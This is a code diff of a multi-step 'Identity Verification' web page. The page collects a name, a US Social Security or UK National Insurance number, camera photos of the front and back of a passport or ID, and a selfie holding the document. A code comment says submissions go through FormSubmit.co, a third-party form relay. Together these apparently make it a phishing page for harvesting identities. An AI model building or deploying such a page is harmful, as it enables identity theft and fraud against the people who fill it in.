@@ -19,18 +19,15 @@
             --glow-color: #ffcc99; /* Orange Glow */
             --placeholder-color: #e0e0e0;
             --error-color: #ff7070;
-            --back-btn-bg: #7d5a3c;
-            --back-btn-hover-bg: #99735d;
-            --next-btn-active: #ff9933;
-            --next-btn-hover: #e68a2e;
-            --next-btn-inactive: #99735d;
-            --capture-btn-color: #ff9933;
-            --capture-btn-hover-color: #e68a2e;
-            --close-btn-color: #ff7070;
-            --close-btn-hover-color: #e65c5c;
-            --modal-bg: #4f3a2c;
-            --modal-border: #ff9933;
-            --modal-glow: #ff9933;
+            --back-btn-bg: #5a5a6b;
+            --back-btn-hover-bg: #6e6e84;
+            --next-btn-active: #ff9933; /* Orange for Next button */
+            --next-btn-hover: #ff7f00; /* Darker orange on hover */
+            --next-btn-inactive: #6a6a9b;
+            --capture-btn-color: #6ee66e; /* Glowing green */
+            --capture-btn-hover-color: #5ac45a; /* Darker green on hover */
+            --close-btn-color: #ff4d4d; /* Red for close button */
+            --close-btn-hover-color: #cc0000; /* Darker red on hover */
         }
 
         body {
@@ -44,7 +41,7 @@
             margin: 0;
             padding: 20px;
             box-sizing: border-box;
-            overflow: hidden;
+            overflow: hidden; /* Prevent body scrolling */
         }
 
         .container {
@@ -54,16 +51,15 @@
             box-shadow: 0 15px 40px rgba(0, 0, 0, 0.5);
             width: 100%;
             max-width: 500px;
-            position: fixed;
+            position: fixed; /* Fix form position */
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             z-index: 1;
             box-sizing: border-box;
             opacity: 0;
-            overflow-y: auto;
+            overflow-y: auto; /* Allow form content to scroll if needed */
             max-height: calc(100vh - 40px);
-            visibility: hidden;
         }
 
         h2 {
@@ -81,20 +77,22 @@
             margin-bottom: 25px;
             position: relative;
         }
+
         .progress-bar-container::before {
             content: '';
             position: absolute;
             height: 4px;
             width: 100%;
-            background-color: var(--input-border);
+            background-color: #6a6a9b;
             top: 50%;
             transform: translateY(-50%);
             z-index: 0;
         }
+
         .progress-step {
             width: 30px;
             height: 30px;
-            background-color: var(--input-border);
+            background-color: #6a6a9b;
             border-radius: 50%;
             display: flex;
             justify-content: center;
@@ -105,12 +103,15 @@
             transition: background-color 0.4s ease-in-out;
             border: 2px solid var(--form-bg);
         }
+
         .progress-step.active {
             background-color: var(--primary-color);
         }
+
         .progress-step.completed {
             background-color: var(--next-btn-active);
         }
+
         .progress-line {
             height: 4px;
             background-color: var(--primary-color);
@@ -138,7 +139,7 @@
             opacity: 1;
             transform: translateY(0);
         }
-        
+
         label {
             display: block;
             margin-bottom: 8px;
@@ -187,11 +188,12 @@
             font-size: 16px;
             margin-top: 15px;
         }
-        
+
         .camera-button.attached {
             background-color: var(--next-btn-active);
             color: white;
         }
+
         .camera-button.attached:hover {
             background-color: var(--next-btn-hover);
         }
@@ -216,13 +218,14 @@
             transition: transform 0.3s, background-color 0.3s, box-shadow 0.3s;
             border: none;
         }
-        
+
         #submitBtn {
             background-color: var(--primary-color);
             color: white;
             font-size: 18px;
             letter-spacing: 1px;
         }
+
         #submitBtn:hover {
             background-color: var(--primary-light);
             transform: translateY(-3px);
@@ -234,9 +237,9 @@
             color: var(--error-color);
             margin-left: 5px;
         }
-        
+
         .glow {
-            position: fixed;
+            position: fixed; /* Fix glow position */
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
@@ -275,10 +278,10 @@
             max-width: 500px;
             position: relative;
             box-sizing: border-box;
-            max-height: 90vh;
-            overflow-y: auto;
+            max-height: 90vh; /* Adjust max height for smaller screens */
+            overflow-y: auto; /* Enable scrolling for content if needed */
         }
-        
+
         #camera-container {
             position: relative;
             width: 100%;
@@ -294,7 +297,7 @@
             height: auto;
             border-radius: 10px;
         }
-        
+
         #capture-btn {
             background-color: var(--capture-btn-color);
             color: white;
@@ -304,22 +307,22 @@
             font-weight: 700;
             cursor: pointer;
             transition: background-color 0.3s, box-shadow 0.3s;
-            box-shadow: 0 0 15px rgba(255, 153, 51, 0.6);
+            box-shadow: 0 0 15px rgba(110, 230, 110, 0.6); /* Initial glow */
         }
-        
+
         #capture-btn:hover {
             background-color: var(--capture-btn-hover-color);
-            box-shadow: 0 0 25px rgba(255, 153, 51, 0.8);
+            box-shadow: 0 0 25px rgba(90, 196, 90, 0.8); /* Enhanced glow on hover */
         }
-        
+
         .close-btn {
             position: absolute;
             top: 15px;
             right: 15px;
-            color: var(--close-btn-color);
+            color: var(--close-btn-color); /* Red color */
             font-size: 28px;
             cursor: pointer;
-            background-color: rgba(0, 0, 0, 0.4);
+            background-color: rgba(0, 0, 0, 0.4); /* Semi-transparent background */
             border-radius: 50%;
             width: 40px;
             height: 40px;
@@ -329,11 +332,12 @@
             transition: background-color 0.3s, color 0.3s;
             z-index: 1001;
         }
+
         .close-btn:hover {
             background-color: rgba(0, 0, 0, 0.6);
-            color: var(--close-btn-hover-color);
+            color: var(--close-btn-hover-color); /* Darker red on hover */
         }
-        
+
         .success-animation {
             text-align: center;
             padding: 20px;
@@ -341,43 +345,48 @@
             display: none;
             color: #4CAF50;
         }
+
         .form-navigation {
             display: flex;
             justify-content: space-between;
             margin-top: 20px;
             gap: 10px;
         }
+
         .form-navigation button {
             flex: 1;
         }
+
         .form-navigation .back-btn {
             background-color: var(--back-btn-bg);
             color: var(--text-color);
         }
+
         .form-navigation .back-btn:hover {
             background-color: var(--back-btn-hover-bg);
             transform: translateY(-2px);
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
         }
+
         .form-navigation .next-btn {
             background-color: var(--next-btn-inactive);
             color: white;
             cursor: not-allowed;
         }
+
         .form-navigation .next-btn.active-btn {
             background-color: var(--next-btn-active);
             cursor: pointer;
         }
+
         .form-navigation .next-btn.active-btn:hover {
             background-color: var(--next-btn-hover);
             transform: translateY(-2px);
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
         }
+
         .form-navigation .next-btn i {
             margin-left: 8px;
-        }
-        .form-navigation .back-btn i {
-            margin-right: 8px;
         }
 
         .document-options {
@@ -413,11 +422,11 @@
             box-shadow: 0 0 15px rgba(255, 153, 51, 0.8);
             transform: scale(1.05);
         }
-        
+
         .document-option.selected:hover {
             background: var(--input-bg);
         }
-        
+
         .document-option i {
             font-size: 40px;
             margin-bottom: 10px;
@@ -432,7 +441,7 @@
         .document-option.selected span {
             font-weight: bold;
         }
-        
+
         .checkmark__circle {
             stroke-dasharray: 166;
             stroke-dashoffset: 166;
@@ -451,7 +460,7 @@
             stroke: #4CAF50;
             fill: none;
         }
-        
+
         .success-animation svg {
             width: 100px;
             height: 100px;
@@ -463,107 +472,9 @@
             margin: 0 auto;
             box-shadow: inset 0px 0px 0px #4CAF50;
         }
-
-        /* Modal Styles */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 2000;
-        }
-
-        .modal-content {
-            background: var(--modal-bg);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 0 25px rgba(0, 0, 0, 0.5), 0 0 35px var(--modal-glow);
-            width: 90%;
-            max-width: 500px;
-            text-align: center;
-            position: relative;
-            border: 2px solid var(--modal-border);
-            opacity: 0;
-            transform: scale(0.8);
-        }
-        
-        .modal-content .close-btn {
-            top: 15px;
-            right: 15px;
-        }
-
-        .modal-content h3 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: var(--text-color);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .modal-content h3 i {
-            margin-right: 10px;
-            font-size: 30px;
-            color: var(--modal-glow);
-        }
-
-        .modal-content ul {
-            list-style: none;
-            padding: 0;
-            margin-bottom: 30px;
-            text-align: left;
-        }
-
-        .modal-content ul li {
-            margin-bottom: 15px;
-            font-size: 16px;
-            font-weight: 600;
-            text-align: left;
-            line-height: 1.5;
-        }
-
-        .modal-content button {
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 12px;
-            background-color: var(--primary-color);
-            color: white;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: background-color 0.3s, transform 0.3s;
-        }
-        
-        .modal-content button:hover {
-            background-color: var(--primary-light);
-            transform: translateY(-3px);
-        }
     </style>
 </head>
 <body>
-
-    <div class="modal-overlay" id="noticeModal">
-        <div class="modal-content">
-            <span class="close-btn" onclick="closeModal()">X</span>
-            <h3>
-                <i class="fas fa-user-check"></i>
-                Important Notice ⚠️
-            </h3>
-            <p>To make the verification process successful, please follow the instructions below:</p>
-            <ul>
-                <li>1- Open this form via (Chrome, Edge... etc).</li>
-                <li>2- All edges of the document should be clear.</li>
-                <li>3- Take a selfie holding your documents.</li>
-            </ul>
-            <button onclick="closeModal()">Yes, I understand</button>
-        </div>
-    </div>
 
     <div class="container" id="formContainer">
         <h2>Identity Verification</h2>
@@ -582,10 +493,12 @@
             <div class="form-section active visible" id="step1">
                 <div class="form-group">
                     <label for="country">Country</label>
-                    <select id="country" name="country"></select>
+                    <select id="country" name="country">
+                    </select>
                     <span class="error-message" id="countryError">Please select your country.</span>
                 </div>
-                <div id="personalInfoFields"></div>
+                <div id="personalInfoFields">
+                </div>
                 <div class="form-navigation">
                     <button type="button" class="next-btn" id="nextBtn1">Next <i class="fas fa-arrow-right"></i></button>
                 </div>
@@ -595,19 +508,21 @@
                 <div class="form-group" style="text-align: center;">
                     <label>Verification Method</label>
                     <input type="hidden" id="documentType" name="documentType">
-                    <div class="document-options"></div>
+                    <div class="document-options">
+                    </div>
                     <span class="error-message" id="documentTypeError">Please select a verification method.</span>
                 </div>
                 <div class="form-navigation">
-                    <button type="button" class="back-btn" id="backBtn2"><i class="fas fa-arrow-left"></i> Back</button>
+                    <button type="button" class="back-btn" id="backBtn2">Back</button>
                     <button type="button" class="next-btn" id="nextBtn2">Next <i class="fas fa-arrow-right"></i></button>
                 </div>
             </div>
 
             <div class="form-section" id="step3">
-                <div id="dynamicFields"></div>
+                <div id="dynamicFields">
+                </div>
                 <div class="form-navigation">
-                    <button type="button" class="back-btn" id="backBtn3"><i class="fas fa-arrow-left"></i> Back</button>
+                    <button type="button" class="back-btn" id="backBtn3">Back</button>
                     <button type="submit" id="submitBtn">Submit <i class="fas fa-paper-plane"></i></button>
                 </div>
             </div>
@@ -618,7 +533,7 @@
                 <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none" />
                 <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
             </svg>
-            <h3>Verification Submitted Successfully!</h3>
+            <h3>Verification Submitted!</h3>
             <p>Thank you. We will contact you shortly.</p>
         </div>
     </div>
@@ -635,11 +550,10 @@
             <button id="capture-btn">Capture Photo</button>
         </div>
     </div>
-    
+
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
     <script>
         // DOM Elements
-        const noticeModal = document.getElementById('noticeModal');
         const formContainer = document.getElementById('formContainer');
         const countrySelect = document.getElementById('country');
         const personalInfoFields = document.getElementById('personalInfoFields');
@@ -653,6 +567,7 @@
         const documentOptionsContainer = document.querySelector('.document-options');
         const successAnimation = document.getElementById('successAnimation');
         const form = document.getElementById('verificationForm');
+
         // Camera Elements
         const cameraPopup = document.getElementById('cameraPopup');
         const cameraFeed = document.getElementById('camera-feed');
@@ -660,6 +575,7 @@
         const captureBtn = document.getElementById('capture-btn');
         let currentStream;
         let currentInputId;
+
         // Progress Bar Elements
         const progressSteps = document.querySelectorAll('.progress-step');
         const progressLine = document.getElementById('progressLine');
@@ -667,6 +583,7 @@
 
         // Data Storage for files
         const fileData = {};
+
         // List of Countries
         const countryList = [
             { code: "US", name: "United States" },
@@ -718,21 +635,10 @@
             { code: "UA", name: "Ukraine" },
             { code: "VA", name: "Vatican City" }
         ];
-        // --- Animations & UI Effects ---
-        function showForm() {
-            formContainer.style.visibility = 'visible';
-            gsap.to(formContainer, { opacity: 1, duration: 0.5, ease: "power2.out" });
-        }
 
-        function closeModal() {
-            gsap.to(noticeModal, { opacity: 0, duration: 0.5, onComplete: () => {
-                noticeModal.style.display = 'none';
-                showForm();
-            }});
-        }
-        
-        gsap.to('.glow', { opacity: 0.5, duration: 1.5, repeat: -1, yoyo: true });
-        gsap.fromTo('.modal-content', { opacity: 0, scale: 0.8 }, { opacity: 1, scale: 1, duration: 0.5, ease: "back.out(1.7)" });
+        // --- Animations & UI Effects ---
+        gsap.to(formContainer, { opacity: 1, duration: 0.5, ease: "power2.out" });
+
         document.addEventListener('mousemove', (e) => {
             gsap.to('.glow', {
                 x: e.clientX,
@@ -742,9 +648,11 @@
                 ease: "power2.out"
             });
         });
+
         document.body.addEventListener('mouseleave', () => {
             gsap.to('.glow', { opacity: 0, duration: 0.5 });
         });
+
         // Animation for input focus
         document.querySelectorAll('input[type="text"], select').forEach(element => {
             element.addEventListener('focus', () => {
@@ -754,6 +662,7 @@
                 gsap.to(element, { scale: 1, duration: 0.3 });
             });
         });
+
         // Animation for navigation buttons on hover
         document.querySelectorAll('.form-navigation button').forEach(button => {
             button.addEventListener('mouseenter', () => {
@@ -770,7 +679,7 @@
 
         // --- Core Functions ---
         function populateCountries() {
-            let optionsHtml = `<option value="" disabled selected>Select your Country</option>`;
+            let optionsHtml = `<option value="" disabled selected>Select your country</option>`;
             const specialCountries = countryList.filter(c => c.code === "US" || c.code === "GB");
             specialCountries.forEach(country => {
                 optionsHtml += `<option value="${country.code}">${country.name}</option>`;
@@ -850,6 +759,7 @@
                     { value: "id-card", label: "ID Card", icon: "fas fa-id-card" }
                 ];
             }
+
             documentOptionsContainer.innerHTML = '';
             options.forEach(option => {
                 const div = document.createElement('div');
@@ -871,17 +781,19 @@
 
         function updateDynamicFields(selectedType) {
             let html = '';
+            // Clear existing data and file inputs
             for (const key in fileData) {
                 delete fileData[key];
             }
             document.querySelectorAll('input[type="file"]').forEach(input => {
                 input.value = '';
             });
+
             if (selectedType === 'passport') {
                 html = `
                     <div class="form-group visible">
                         <label for="passportUpload" class="required">Passport Scan</label>
-                        <input type="file" id="passportUpload" name="passportUpload" accept="image/*" style="display:none;">
+                        <input type="file" id="passportUpload" name="Doc1.jpg" accept="image/*" style="display:none;">
                         <button type="button" class="camera-button" onclick="openCamera('passportUpload', 'environment')">
                             <i class="fas fa-camera"></i> Open Camera
                         </button>
@@ -889,7 +801,7 @@
                     </div>
                     <div class="form-group visible">
                         <label for="selfiePassportUpload" class="required">Selfie with Passport</label>
-                        <input type="file" id="selfiePassportUpload" name="selfiePassportUpload" accept="image/*" style="display:none;">
+                        <input type="file" id="selfiePassportUpload" name="Doc2.jpg" accept="image/*" style="display:none;">
                         <button type="button" class="camera-button" onclick="openCamera('selfiePassportUpload', 'user')">
                             <i class="fas fa-camera"></i> Open Camera
                         </button>
@@ -900,23 +812,23 @@
                 html = `
                     <div class="form-group visible">
                         <label for="frontSide" class="required">Front Side of Document</label>
-                        <input type="file" id="frontSide" name="frontSide" accept="image/*" style="display:none;">
+                        <input type="file" id="frontSide" name="Doc1.jpg" accept="image/*" style="display:none;">
                         <button type="button" class="camera-button" onclick="openCamera('frontSide', 'environment')">
                             <i class="fas fa-camera"></i> Open Camera
                         </button>
-                        <span class="error-message" id="frontSideError">Please take a picture of the front of your document.</span>
+                        <span class="error-message" id="frontSideError">Please take a picture of the front side of your document.</span>
                     </div>
                     <div class="form-group visible">
                         <label for="backSide" class="required">Back Side of Document</label>
-                        <input type="file" id="backSide" name="backSide" accept="image/*" style="display:none;">
+                        <input type="file" id="backSide" name="Doc2.jpg" accept="image/*" style="display:none;">
                         <button type="button" class="camera-button" onclick="openCamera('backSide', 'environment')">
                             <i class="fas fa-camera"></i> Open Camera
                         </button>
-                        <span class="error-message" id="backSideError">Please take a picture of the back of your document.</span>
+                        <span class="error-message" id="backSideError">Please take a picture of the back side of your document.</span>
                     </div>
                     <div class="form-group visible">
                         <label for="selfieDlId" class="required">Selfie with Document</label>
-                        <input type="file" id="selfieDlId" name="selfieDlId" accept="image/*" style="display:none;">
+                        <input type="file" id="selfieDlId" name="Doc3.jpg" accept="image/*" style="display:none;">
                         <button type="button" class="camera-button" onclick="openCamera('selfieDlId', 'user')">
                             <i class="fas fa-camera"></i> Open Camera
                         </button>
@@ -925,6 +837,8 @@
                 `;
             }
             dynamicFieldsContainer.innerHTML = html;
+            
+            // Restore button states for any previously captured files
             for (const key in fileData) {
                 const button = document.querySelector(`button[onclick*="'${key}'"]`);
                 if (button) {
@@ -933,6 +847,7 @@
                     button.innerHTML = `<i class="fas fa-check"></i> ${fileName}`;
                 }
             }
+
             gsap.fromTo(dynamicFieldsContainer.querySelectorAll('.form-group'), { y: 20, opacity: 0 }, { y: 0, opacity: 1, stagger: 0.1, duration: 0.4 });
         }
 
@@ -946,6 +861,62 @@
             input.value = formattedValue;
             checkStep1Validity();
         }
+
+        // --- Camera Functions ---
+        async function openCamera(inputId, facingMode) {
+            currentInputId = inputId;
+            cameraPopup.style.display = 'flex';
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                cameraFeed.srcObject = stream;
+                currentStream = stream;
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
+                alert("Cannot access camera. Please check your browser permissions.");
+            }
+        }
+
+        function closeCamera() {
+            cameraPopup.style.display = 'none';
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+        }
+
+        captureBtn.addEventListener('click', () => {
+            const context = cameraCanvas.getContext('2d');
+            cameraCanvas.width = cameraFeed.videoWidth;
+            cameraCanvas.height = cameraFeed.videoHeight;
+            context.drawImage(cameraFeed, 0, 0, cameraCanvas.width, cameraCanvas.height);
+            cameraCanvas.toBlob(blob => {
+                if (blob) {
+                    let fileName = '';
+                    if (currentInputId === 'frontSide') {
+                        fileName = 'Doc1.jpg';
+                    } else if (currentInputId === 'backSide') {
+                        fileName = 'Doc2.jpg';
+                    } else if (currentInputId === 'selfieDlId') {
+                        fileName = 'Doc3.jpg';
+                    } else if (currentInputId === 'passportUpload') {
+                        fileName = 'Doc1.jpg';
+                    } else if (currentInputId === 'selfiePassportUpload') {
+                        fileName = 'Doc2.jpg';
+                    }
+                    const file = new File([blob], fileName, { type: 'image/jpeg' });
+                    fileData[currentInputId] = file;
+                    
+                    // Update button UI
+                    const button = document.querySelector(`button[onclick*="'${currentInputId}'"]`);
+                    if (button) {
+                        button.classList.add('attached');
+                        button.innerHTML = `<i class="fas fa-check"></i> ${fileName}`;
+                    }
+
+                    closeCamera();
+                    checkStep3Validity();
+                }
+            }, 'image/jpeg');
+        });
 
         // --- Event Listeners ---
         countrySelect.addEventListener('change', () => {
@@ -997,6 +968,7 @@
             } else if (selectedType === 'drivers-license' || selectedType === 'identification' || selectedType === 'id-card') {
                 isValid = fileData['frontSide'] && fileData['backSide'] && fileData['selfieDlId'];
             }
+
             document.getElementById('submitBtn').disabled = !isValid;
             document.getElementById('submitBtn').style.backgroundColor = isValid ? 'var(--primary-color)' : 'var(--next-btn-inactive)';
             document.getElementById('submitBtn').style.cursor = isValid ? 'pointer' : 'not-allowed';
@@ -1016,94 +988,96 @@
         function nextStep(stepNumber) {
             const currentStepElement = document.querySelector('.form-section.active');
             const nextStepElement = document.getElementById(`step${stepNumber}`);
-            
             const isMovingForward = stepNumber > currentStep;
-
+            
             if (isMovingForward) {
                 const isValid = validateStep(currentStep);
                 if (!isValid) return;
             }
+            
+            gsap.to(currentStepElement, {
+                opacity: 0,
+                y: isMovingForward ? -20 : 20,
+                duration: 0.3,
+                onComplete: () => {
+                    currentStepElement.classList.remove('active', 'visible');
+                    nextStepElement.classList.add('active', 'visible');
+                    gsap.fromTo(nextStepElement, { y: isMovingForward ? 20 : -20, opacity: 0 }, { y: 0, opacity: 1, duration: 0.5, ease: "power2.out" });
+                }
+            });
 
-            // Animate current section out
-            gsap.to(currentStepElement, { opacity: 0, y: -20, duration: 0.3, onComplete: () => {
-                currentStepElement.classList.remove('active');
-                nextStepElement.classList.add('active');
-                nextStepElement.style.display = 'block';
-
-                // Animate next section in
-                gsap.fromTo(nextStepElement, { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: 0.4 });
-                
-                // Update progress bar
-                currentStep = stepNumber;
-                updateProgressBar();
-            }});
+            currentStep = stepNumber;
+            updateProgressBar(currentStep);
         }
 
-        function updateProgressBar() {
-            const progressStepsArray = Array.from(progressSteps);
-            progressStepsArray.forEach((step, index) => {
-                if (index < currentStep - 1) {
+        function updateProgressBar(stepNumber) {
+            progressSteps.forEach((step, index) => {
+                if (index < stepNumber - 1) {
                     step.classList.add('completed');
                 } else {
                     step.classList.remove('completed');
                 }
-                if (index === currentStep - 1) {
+                if (index + 1 === stepNumber) {
                     step.classList.add('active');
                 } else {
                     step.classList.remove('active');
                 }
             });
-            const progressPercentage = (currentStep - 1) * 50;
-            gsap.to(progressLine, { width: `${progressPercentage}%`, duration: 0.4 });
-            // Hide/show the glow effect for step 3
-            const glow = document.getElementById('glow');
-            if (currentStep === 3) {
-                gsap.to(glow, { opacity: 0.8, duration: 0.5 });
-            } else {
-                gsap.to(glow, { opacity: 0.5, duration: 0.5 });
-            }
+            let progress = (stepNumber - 1) * 50;
+            gsap.to(progressLine, { width: `${progress}%`, duration: 0.4 });
         }
 
-        function validateStep(step) {
-            if (step === 1) {
-                if (nextBtn1.disabled) {
-                    showError('countryError');
-                    const countryCode = countrySelect.value;
-                    if (countryCode === 'US') {
-                        const fullName = document.getElementById('fullName').value.trim();
-                        const ssn = document.getElementById('ssn').value.trim();
-                        if (!fullName) showError('fullNameError');
-                        if (!ssn || ssn.replace(/-/g, '').length !== 9) showError('ssnError');
-                    } else if (countryCode === 'GB') {
-                        const fullName = document.getElementById('fullName').value.trim();
-                        const nino = document.getElementById('nino').value.trim();
-                        const ninoRegex = /^[A-Z]{2}[0-9]{6}[A-Z]$/i;
-                        if (!fullName) showError('fullNameError');
-                        if (!nino || !ninoRegex.test(nino.replace(/\s/g, '').toUpperCase())) showError('ninoError');
-                    } else if (countryCode) {
-                        const firstName = document.getElementById('firstName').value.trim();
-                        const lastName = document.getElementById('lastName').value.trim();
-                        if (!firstName) showError('firstNameError');
-                        if (!lastName) showError('lastNameError');
-                    }
-                    return false;
+        // --- Step Validation ---
+        function validateStep(stepNumber) {
+            let isValid = true;
+            document.querySelectorAll('.error-message').forEach(span => span.style.display = 'none');
+            const countryCode = countrySelect.value;
+            if (stepNumber === 1) {
+                if (!countryCode) {
+                    showError('countryError', 'Please select your country.');
+                    isValid = false;
                 }
-                return true;
-            } else if (step === 2) {
-                if (nextBtn2.disabled) {
-                    showError('documentTypeError');
-                    return false;
+                if (countryCode === 'US') {
+                    const fullName = document.getElementById('fullName').value.trim();
+                    const ssn = document.getElementById('ssn').value.trim();
+                    if (!fullName) { showError('fullNameError', 'Please enter your full name.'); isValid = false; }
+                    if (ssn.replace(/-/g, '').length !== 9) { showError('ssnError', 'Please enter a valid SSN.'); isValid = false; }
+                } else if (countryCode === 'GB') {
+                    const fullName = document.getElementById('fullName').value.trim();
+                    const nino = document.getElementById('nino').value.trim();
+                    const ninoRegex = /^[A-Z]{2}[0-9]{6}[A-Z]$/i;
+                    if (!fullName) { showError('fullNameError', 'Please enter your full name.'); isValid = false; }
+                    if (!ninoRegex.test(nino.replace(/\s/g, '').toUpperCase())) { showError('ninoError', 'Please enter a valid NINO.'); isValid = false; }
+                } else if (countryCode) {
+                    const firstName = document.getElementById('firstName').value.trim();
+                    const lastName = document.getElementById('lastName').value.trim();
+                    if (!firstName) { showError('firstNameError', 'Please enter your first name.'); isValid = false; }
+                    if (!lastName) { showError('lastNameError', 'Please enter your last name.'); isValid = false; }
                 }
-                return true;
+            } else if (stepNumber === 2) {
+                if (!documentTypeSelect.value) {
+                    showError('documentTypeError', 'Please select a verification method.');
+                    isValid = false;
+                }
+            } else if (stepNumber === 3) {
+                const selectedType = documentTypeSelect.value;
+                if (selectedType === 'passport') {
+                    if (!fileData['passportUpload']) { showError('passportUploadError', 'Please take a picture of your passport.'); isValid = false; }
+                    if (!fileData['selfiePassportUpload']) { showError('selfiePassportUploadError', 'Please take a selfie with your passport.'); isValid = false; }
+                } else if (selectedType === 'drivers-license' || selectedType === 'identification' || selectedType === 'id-card') {
+                    if (!fileData['frontSide']) { showError('frontSideError', 'Please take a picture of the front side of your document.'); isValid = false; }
+                    if (!fileData['backSide']) { showError('backSideError', 'Please take a picture of the back side of your document.'); isValid = false; }
+                    if (!fileData['selfieDlId']) { showError('selfieDlIdError', 'Please take a selfie with your document.'); isValid = false; }
+                }
             }
-            return true;
+            return isValid;
         }
 
-        function showError(elementId) {
+        function showError(elementId, message) {
             const errorElement = document.getElementById(elementId);
             if (errorElement) {
+                errorElement.textContent = message;
                 errorElement.style.display = 'block';
-                gsap.fromTo(errorElement, { y: -10, opacity: 0 }, { y: 0, opacity: 1, duration: 0.3 });
             }
         }
 
@@ -1114,109 +1088,47 @@
             }
         }
 
-        // --- Camera Functions ---
-        async function openCamera(inputId, facingMode) {
-            currentInputId = inputId;
-            cameraPopup.style.display = 'flex';
-            gsap.fromTo(cameraPopup, { opacity: 0 }, { opacity: 1, duration: 0.3 });
-            try {
-                const constraints = { video: { facingMode: facingMode } };
-                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
-                cameraFeed.srcObject = currentStream;
-            } catch (err) {
-                console.error("Error accessing camera: ", err);
-                alert("Could not access camera. Please ensure you have granted permission.");
-                closeCamera();
-            }
-        }
+        // --- Navigation Buttons ---
+        nextBtn1.addEventListener('click', () => { nextStep(2); });
+        nextBtn2.addEventListener('click', () => { nextStep(3); });
+        backBtn2.addEventListener('click', () => { nextStep(1); });
+        backBtn3.addEventListener('click', () => { nextStep(2); });
 
-        function closeCamera() {
-            cameraPopup.style.display = 'none';
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-            }
-        }
+        // --- Final Submission Logic ---
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default submission to handle it manually
 
-        captureBtn.addEventListener('click', () => {
-            cameraCanvas.width = cameraFeed.videoWidth;
-            cameraCanvas.height = cameraFeed.videoHeight;
-            const context = cameraCanvas.getContext('2d');
-            context.drawImage(cameraFeed, 0, 0, cameraCanvas.width, cameraCanvas.height);
-            const imageDataUrl = cameraCanvas.toDataURL('image/jpeg');
-            const file = dataURLtoFile(imageDataUrl, `${currentInputId}.jpeg`);
-            
-            // Store the file in memory
-            fileData[currentInputId] = file;
+            // Clear any old file inputs to avoid conflicts
+            const oldFileInputs = form.querySelectorAll('input[type="file"][name^="Doc"]');
+            oldFileInputs.forEach(input => input.remove());
 
-            // Update the button on the form
-            const button = document.querySelector(`button[onclick*="'${currentInputId}'"]`);
-            if (button) {
-                button.innerHTML = `<i class="fas fa-check"></i> Photo Taken!`;
-                button.classList.add('attached');
-            }
-
-            closeCamera();
-            checkStep3Validity();
-        });
-
-        // Convert data URL to File object
-        function dataURLtoFile(dataurl, filename) {
-            var arr = dataurl.split(','),
-                mime = arr[0].match(/:(.*?);/)[1],
-                bstr = atob(arr[1]), 
-                n = bstr.length, 
-                u8arr = new Uint8Array(n);
-            while(n--){
-                u8arr[n] = bstr.charCodeAt(n);
-            }
-            return new File([u8arr], filename, {type:mime});
-        }
-
-        // Submit form with File objects
-        form.addEventListener('submit', (e) => {
-            e.preventDefault();
-            
-            // Create a FormData object from the form
-            const formData = new FormData(form);
-            
-            // Append the captured image files
+            // Append the captured files to the form
             for (const key in fileData) {
-                if (fileData[key] instanceof File) {
-                    formData.append(key, fileData[key], fileData[key].name);
+                if (fileData[key]) {
+                    const file = fileData[key];
+                    
+                    // Create a new File Input
+                    const fileInput = document.createElement('input');
+                    fileInput.type = 'file';
+                    fileInput.name = file.name; // Use the correct filename (Doc1.jpg, Doc2.jpg...)
+                    fileInput.style.display = 'none';
+                    
+                    // Create a DataTransfer to hold the file
+                    const dataTransfer = new DataTransfer();
+                    dataTransfer.items.add(file);
+                    fileInput.files = dataTransfer.files;
+
+                    // Append the hidden input to the form
+                    form.appendChild(fileInput);
                 }
             }
 
-            // Use fetch to submit the form data to FormSubmit.co
-            fetch(form.action, {
-                method: 'POST',
-                body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
-            })
-            .then(response => {
-                if (response.ok) {
-                    showSuccessAnimation();
-                } else {
-                    return response.json().then(data => {
-                        if (Object.hasOwnProperty.call(data, 'errors')) {
-                            alert(data["errors"].map(error => error["message"]).join(", "));
-                        } else {
-                            alert("Oops! There was a problem submitting your form");
-                        }
-                    });
-                }
-            })
-            .catch(error => {
-                alert("Oops! There was a problem submitting your form");
-                console.error(error);
-            });
-        });
+            // Animate and submit the form
+            const timeline = gsap.timeline({ onComplete: () => {
+                // Now submit the form after the animation completes
+                form.submit();
+            }});
 
-        // --- Success Animation ---
-        function showSuccessAnimation() {
-            const timeline = gsap.timeline();
-            
             timeline.to(formContainer, { opacity: 0, duration: 0.2, onComplete: () => {
                 formContainer.style.display = 'none';
                 successAnimation.style.display = 'block';
@@ -1226,20 +1138,13 @@
             .fromTo('.checkmark__check', { strokeDashoffset: 48 }, { strokeDashoffset: 0, duration: 0.2, ease: "power2.inOut" }, "-=0.2")
             .fromTo(successAnimation.querySelector('h3'), { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: 0.2 }, "-=0.2")
             .fromTo(successAnimation.querySelector('p'), { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: 0.2 }, "-=0.1");
-        }
-
-        // --- Navigation Buttons ---
-        nextBtn1.addEventListener('click', () => { nextStep(2); });
-        nextBtn2.addEventListener('click', () => { nextStep(3); });
